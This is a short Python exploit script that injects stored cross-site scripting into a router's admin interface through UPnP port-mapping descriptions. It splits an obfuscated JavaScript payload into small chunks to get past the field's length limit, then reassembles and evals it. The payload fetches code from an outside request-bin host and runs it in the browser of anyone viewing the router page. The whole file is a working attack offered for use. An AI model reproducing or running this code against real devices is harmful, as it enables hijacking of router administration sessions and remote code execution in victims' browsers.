import upnpclient
from rich.progress import track
from rich import print
import time 
ID = 1
dev = upnpclient.Device("http://192.168.0.1:1900/gatedesc.xml")

def sendChunk(payload):
    global ID 
    desc = f'<style/onload="{payload}">'
    assert len(desc) < 33 , f"payload is to long {len(desc)}>32"
    dev.WANIPConn1.AddPortMapping(
        NewRemoteHost='0.0.0.1',
        NewExternalPort=12345+ID,
        NewProtocol='TCP',
        NewInternalPort=22345+ID,
        NewInternalClient='192.168.0.100',
        NewEnabled='1',
        NewPortMappingDescription=desc,
        NewLeaseDuration=10000)
    ID += 1
def sendBigPayload(payload):
    CHUNK_SIZE= 6
    total_payload = ""
    chunks = [payload[i:i+CHUNK_SIZE] for i in range(0, len(payload), CHUNK_SIZE)]
    sendChunk(t:="$.a='';")
    total_payload += t
    for  chunk in track(chunks, description="Sending chunks"):
        time.sleep(0.1)
        sendChunk(t:=f"$.a+='{chunk}';")
        total_payload +=t
    sendChunk(t:="eval($.a);")
    total_payload += t
    return total_payload

def splitUp_send(payload2):
    li = str([ord(c) for c in payload2]).replace(" ","").replace("[","").replace("]","")
    return sendBigPayload(f"""eval(String.fromCharCode({li}))"""),f"""eval(String.fromCharCode({li}))"""

PAYLOAD = 'fetch("[YOUR REQUEST BIN]").then(resp =>(resp.text().then(r=>eval(r))))'
split_payload,num_payload = splitUp_send(PAYLOAD)
print("\n\n"+"="*10+"Final Payload"+10*"="+ "\n\n" )
print(split_payload)
print("\n\n"+"="*10+"Number encoded"+10*"="+ "\n\n" )
print(num_payload)

